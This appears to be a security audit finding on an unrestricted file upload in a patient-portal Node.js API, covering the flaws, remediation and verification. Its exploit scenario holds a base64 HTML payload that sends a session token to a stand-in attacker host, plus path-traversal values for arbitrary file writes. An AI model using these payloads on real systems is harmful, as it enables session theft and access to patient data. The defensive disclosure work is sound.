# SEC-014 — Unrestricted file upload: path traversal and stored XSS on the API origin

| Field | Value |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 8.3 (`AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L`) |
| OWASP Top 10 2021 | A03:2021 – Injection; A01:2021 – Broken Access Control |
| OWASP ASVS 4.0.3 | V12.1.1 – Upload size limits; V12.2.1 – File type validated against expected type; V12.3.1 – Filename metadata not used directly; V12.5.2 – Uploaded files not served from the application origin |
| CWE | CWE-434 – Unrestricted Upload of File with Dangerous Type; CWE-22 – Path Traversal; CWE-79 – Stored Cross-Site Scripting |
| Status | Open |
| Affected component | `services/dataService.js`, `controllers/dataController.js`, `index.js`, `services/patientService.js`, `services/labTestService.js` |

## Summary

The base64 upload handler derives the stored file's **extension from a client-supplied MIME type** and a **directory path segment from a client-supplied `type` field**, with no allow-list on either. The resulting file is written under `assets/`, which `index.js:101` serves publicly as static content with no authentication.

Two consequences follow. First, `mimeType: "text/html"` produces a `.html` file that the server returns with `Content-Type: text/html` **on the API's own origin** — stored cross-site scripting. Second, `type: "../../.."` escapes the intended directory, because `path.join` resolves `..` and `mkdirSync({ recursive: true })` will create the destination anywhere the process can write.

There is also no file-size limit beyond the global 50 MB body cap, no magic-byte verification, and no antivirus scanning of files that are later delivered to clinicians.

## Affected code

`services/dataService.js:71-107`:

```js
const matches = fileData.match(/^data:(.+);base64,(.+)$/);
if (!matches) { throw new Error('Invalid Base64 format.'); }

const mimeType   = matches[1];                                             // :84  client-controlled
const base64Data = matches[2];
console.log(mimeType, 'mimeType===');                                      // :86

// Generate a unique filename
const fileExtension = mimeType.split('/')[1];                              // :88  becomes the extension
const fileName = `${crypto.randomBytes(16).toString('hex')}.${fileExtension}`;   // :90

const currentYear = new Date().getFullYear();
const uploadPath = path.join(__dirname, '..', 'assets', type, currentYear.toString());   // :93  `type` client-controlled

if (!fs.existsSync(uploadPath)) {
    fs.mkdirSync(uploadPath, { recursive: true });                         // :97  creates any path
}

const filePath = path.join(uploadPath, fileName);                          // :101
fs.writeFileSync(filePath, base64Data, 'base64');                          // :104
```

The filename itself is safe — `crypto.randomBytes(16)` is a correct choice. The **extension** and the **directory** are not.

`controllers/dataController.js:45,53` — both values come straight from the body; route `routes/dataRoutes.js:9` (`POST /api/data/upload`):

```js
const { file, type } = req.body;
```

`index.js:101` — the upload directory is served publicly:

```js
app.use('/assets', express.static(path.join(__dirname, 'assets')));
```

`express.static` sets `Content-Type` from the file extension, so a stored `.html` file is served as HTML and executed by the browser.

The same unchecked-extension pattern appears at `services/patientService.js:437-461` and `services/labTestService.js:198-221`.

## Technical detail

**Stored XSS.** `mimeType` is whatever appears between `data:` and `;base64,` in the client's string — it is not sniffed from content. Supplying `data:text/html;base64,...` yields `<random>.html`, which `express.static` serves as `text/html`. Script in that file runs on `https://patientportalapi.akosmd.in` — the API's own origin. `image/svg+xml` achieves the same, since SVG can carry `<script>`.

This matters more than a typical reflected XSS because the payload is persistent, is hosted on a trusted clinical domain, and executes in a context from which it can call the API with the victim's credentials. Combined with the absence of `helmet` ([SEC-019](SEC-019-missing-security-headers.md)) there is no CSP to contain it and no `X-Content-Type-Options: nosniff` to prevent content sniffing.

**Path traversal.** `path.join(__dirname, '..', 'assets', type, year)` — when `type` is `"../../.."`, `path.join` normalises the `..` segments and the result escapes `assets/` entirely. `mkdirSync({ recursive: true })` then creates whatever directory the resolved path names. The write is constrained only by the OS permissions of the Node process. Targets of interest include the application's own source directory (overwriting a `.js` file the app will later require) and any web-served path.

**No size limit.** `express.json({ limit: '50mb' })` caps the request, but base64 expands ~33%, and nothing limits total disk consumption. Repeated uploads fill the volume ([SEC-031](SEC-031-cors-and-payload-limits.md)).

**No content verification.** The declared MIME type is never checked against the file's actual magic bytes, so a `.pdf` may contain anything. Files are delivered to clinicians and processed by `pdf-parse`, which is unmaintained and vendors a pre-CVE-2024-4367 pdf.js ([SEC-022](SEC-022-vulnerable-dependencies.md)).

**No access control on retrieval.** Independently of upload, `/assets` serves every stored patient document to anyone with the URL — see [SEC-023](SEC-023-unauthenticated-static-phi.md).

## Exploit scenario

**Stored XSS leading to session theft**

1. Attacker authenticates and posts to `/api/data/upload`:
   ```json
   {
     "type": "patient",
     "file": "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsLmV4YW1wbGUvP2QnKyhsb2NhbFN0b3JhZ2UudG9rZW4pKTwvc2NyaXB0Pg=="
   }
   ```
   (decoded: `<script>fetch('https://evil.example/?d'+(localStorage.token))</script>`)
2. The response returns the stored URL, e.g. `https://patientportalapi.akosmd.in/assets/patient/2026/<hex>.html`.
3. Attacker sends that link to a clinician — credible, because the domain is the clinic's own API host.
4. The script executes on the API origin, reads the token from browser storage, and exfiltrates it. With no CSP and no `nosniff`, nothing intervenes.
5. Attacker replays the token; with [SEC-001](SEC-001-broken-role-enforcement.md) and [SEC-009](SEC-009-tenant-isolation-via-client-header.md) that token reaches every tenant's data.

**Arbitrary file write**

6. Attacker posts with `type: "../../../../var/www/html"` and `mimeType: "text/html"`. The write lands outside `assets/` wherever the process has permission.
7. If the Node process can write to its own source directory, overwriting a required module converts this into code execution on the next restart.

## Impact

- **Confidentiality:** stored XSS on the API origin yields token theft and PHI access under the victim's identity.
- **Integrity:** arbitrary-location file write; potential overwrite of application files.
- **Availability:** unbounded disk consumption.
- **Scope:** changed — the XSS executes in the browser's security context for the API origin, affecting a different component than the vulnerable one.

## Remediation

**Step 1 — allow-list the type, and derive the extension from it.**

```js
// services/dataService.js
const ALLOWED = new Map([
    ['image/jpeg',       'jpg'],
    ['image/png',        'png'],
    ['application/pdf',  'pdf'],
]);
const ALLOWED_CATEGORIES = new Set(['patient', 'chat', 'prescriptions', 'labreports']);
const MAX_BYTES = 10 * 1024 * 1024;

const matches = /^data:([a-z]+\/[a-z0-9.+-]+);base64,(.+)$/i.exec(fileData);
if (!matches) throw new Error('Invalid Base64 format.');

const [, declaredMime, base64Data] = matches;
const extension = ALLOWED.get(declaredMime.toLowerCase());
if (!extension) throw new Error('Unsupported file type.');     // never derive from the MIME string

const buffer = Buffer.from(base64Data, 'base64');
if (buffer.length > MAX_BYTES) throw new Error('File too large.');

// Verify the real content type from magic bytes — the declared type is a hint, not a fact.
const { fileTypeFromBuffer } = await import('file-type');
const actual = await fileTypeFromBuffer(buffer);
if (!actual || actual.mime !== declaredMime.toLowerCase()) {
    throw new Error('File content does not match its declared type.');
}
```

**Step 2 — never let client input become a path segment.**

```js
if (!ALLOWED_CATEGORIES.has(type)) throw new Error('Invalid category.');   // exact match, not sanitisation

const fileName   = `${crypto.randomBytes(16).toString('hex')}.${extension}`;
const uploadRoot = path.resolve(__dirname, '..', 'assets');
const uploadPath = path.resolve(uploadRoot, type, String(new Date().getFullYear()));

// Containment assertion — defence in depth even with the allow-list above.
if (uploadPath !== uploadRoot && !uploadPath.startsWith(uploadRoot + path.sep)) {
    throw new Error('Invalid upload path.');
}

await fs.promises.mkdir(uploadPath, { recursive: true });
await fs.promises.writeFile(path.join(uploadPath, fileName), buffer);
```

Note `path.resolve` plus an explicit prefix check, rather than `path.join` alone. Use the async `fs.promises` API — `writeFileSync` blocks the event loop for every upload.

**Step 3 — stop serving uploads from the application origin.** This is the single most effective change, because it neutralises the XSS class entirely:

- Move uploads to object storage (S3, Azure Blob) on a **separate domain**, served through short-lived signed URLs.
- If they must be served by this application, replace `express.static` with an authenticated handler that streams the file with `Content-Disposition: attachment`, `Content-Type: application/octet-stream` and `X-Content-Type-Options: nosniff`, after the authorisation check from [SEC-023](SEC-023-unauthenticated-static-phi.md).

**Step 4 — supporting controls.**

- Antivirus scanning (ClamAV or an equivalent service) before a file is retrievable — these documents are opened by clinicians.
- Per-user upload quotas and rate limits.
- Add `helmet` with a restrictive CSP ([SEC-019](SEC-019-missing-security-headers.md)) so any residual XSS is contained.
- Remove `console.log(mimeType, 'mimeType===')` at `:86` ([SEC-016](SEC-016-credentials-and-phi-in-logs.md)).
- Apply the same fixes to `patientService.js:437-461` and `labTestService.js:198-221`, and to the stale duplicates in [SEC-033](SEC-033-stale-duplicate-sources.md).

## Verification

1. **HTML upload:** attempt `data:text/html;base64,...`. Must be rejected with 400. Before the fix it is stored and served as HTML.
2. **SVG upload:** attempt `image/svg+xml`. Must be rejected.
3. **Content mismatch:** upload an HTML payload declared as `image/png`. Must be rejected by the magic-byte check.
4. **Traversal:** attempt `type: "../../.."`. Must be rejected, and no directory may be created outside `assets/`.
5. **Size:** attempt an 11 MB file. Must be rejected.
6. **Serving headers:** request a stored file and confirm `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
7. **Static check:** `grep -rn "mimeType.split('/')" services/` returns nothing.

## References

- OWASP — [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- OWASP ASVS 4.0.3 — V12 File and Resources Verification Requirements
- CWE-434 — [Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- CWE-22 — [Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
